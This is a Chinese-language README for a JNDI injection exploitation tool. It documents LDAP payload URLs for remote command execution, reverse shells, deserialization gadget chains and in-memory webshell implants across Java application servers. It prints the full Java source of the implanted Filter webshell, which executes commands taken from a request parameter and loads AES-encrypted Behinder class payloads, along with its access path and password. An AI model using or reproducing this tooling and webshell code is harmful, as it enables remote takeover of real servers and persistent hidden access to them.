## jndi_tool

### 0x1. JNDI工具

编写jndi注入利用工具，生成jar包方式

- 使用idea打开项目，把lib文件夹的jar包添加到依赖，使用maven插件打包生成
- 安装maven，进入项目根目录执行`mvn clean package`生成jar包

### 0x2. 使用说明

使用 `java -jar jndi_tool-1.0-SNAPSHOT.jar -h` 查看参数说明，其中 `--ip` 参数为必选参数

```
Usage: java -jar jndi_tool-1.0-SNAPSHOT.jar [options]
  Options:
  * -i, --ip       Local ip address
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

使用 `java -jar JNDIExploit.jar -u` 查看支持的 LDAP 格式

```
Supported LADP Queries
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
    ldap://127.0.0.1:1389/Basic/Command/[cmd]
    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Basic/TomcatEcho
    ldap://127.0.0.1:1389/Basic/SpringEcho
    ldap://127.0.0.1:1389/Basic/WeblogicEcho
    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/Basic/JettyMemshell
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
    ldap://127.0.0.1:1389/Basic/JBossMemshell
    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
    ldap://127.0.0.1:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK4/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell

[+] GroovyBypass Queries
    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]
```

- 目前支持的所有 `PayloadType` 为
	- `Dnslog`: 用于产生一个`DNS`请求，与 `DNSLog`平台配合使用，对`Linux/Windows`进行了简单的适配
	- `Command`: 用于执行命令，如果命令有特殊字符，支持对命令进行 `Base64编码`后传输
	- `ReverseShell`: 用于 `Linux` 系统的反弹shell，方便使用
	- `TomcatEcho`: 用于在中间件为 `Tomcat` 时命令执行结果的回显，通过添加自定义`header` `cmd: whoami` 的方式传递想要执行的命令
	- `SpringEcho`: 用于在框架为 `SpringMVC/SpringBoot` 时命令执行结果的回显，通过添加自定义`header` `cmd: whoami` 的方式传递想要执行的命令
	- `WeblogicEcho`: 用于在中间件为 `Weblogic` 时命令执行结果的回显，通过添加自定义`header` `cmd: whoami` 的方式传递想要执行的命令
	- `TomcatMemshell1`: 用于植入`Tomcat内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
	- `TomcatMemshell2`: 用于植入`Tomcat内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`, 使用时需要添加额外的`HTTP Header` `Shell: true`, **推荐**使用此方式
	- `SpringMemshell`: 用于植入`Spring内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
	- `WeblogicMemshell1`: 用于植入`Weblogic内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
	- `WeblogicMemshell2`: 用于植入`Weblogic内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`，**推荐**使用此方式
	- `JettyMemshell`: 用于植入`Jetty内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
	- `JBossMemshell`: 用于植入`JBoss内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
	- `WebsphereMemshell`: 用于植入`Websphere内存shell`， 支持`Behinder shell` 与 `Basic cmd shell`
- 目前支持的所有 `GadgetType`为
	- `URLDNS`
	- `CommonsBeanutils1`
	- `CommonsBeanutils2`
	- `CommonsCollectionsK1`
	- `CommonsCollectionsK2`
	- `CommonsCollectionsK3`
	- `CommonsCollectionsK4`
	- `C3P0`
	- `Jdk7u21`
	- `Jre8u20`
	- `CVE_2020_2551`
	- `CVE_2020_2883`

### 0x3. `内存shell`说明（部分场景）

- 采用动态添加 `Filter/Controller`的方式，并将添加的`Filter`移动至`FilterChain`的第一位
- `内存shell` 的兼容性测试结果请参考 [memshell](https://github.com/feihong-cs/memShell) 项目
- `Basic cmd shell` 的访问方式为 `/anything?type=basic&pass=[cmd]`
- `Behinder shell` 的访问方式需要修改`冰蝎`客户端（请参考 [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) 的方式二自行修改），并在访问时需要添加 `X-Options-Ai` 头部，密码为`rebeyond`

植入的 Filter 代码如下：

```java
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String k;
        Cipher cipher;
        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
            k = servletRequest.getParameter("pass");
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        } else if (((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null) {
            try {
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                    k = "e45e329feb5d925b";
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, servletRequest, servletResponse);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }
```



JNDI利用工具参考

- https://github.com/Jeromeyoung/JNDIExploit-1

- https://github.com/veracode-research/rogue-jndi
- https://github.com/welk1n/JNDI-Injection-Exploit
- https://github.com/welk1n/JNDI-Injection-Bypass



### 0x4. 待完善

内存马注入公网靶机后，tomcat线性获取不到，无法加载

![image-20220905234432479](E:/workspaceCTFWP/images/image-20220905234432479.png)

![image-20220905235047071](E:/workspaceCTFWP/images/image-20220905235047071.png)
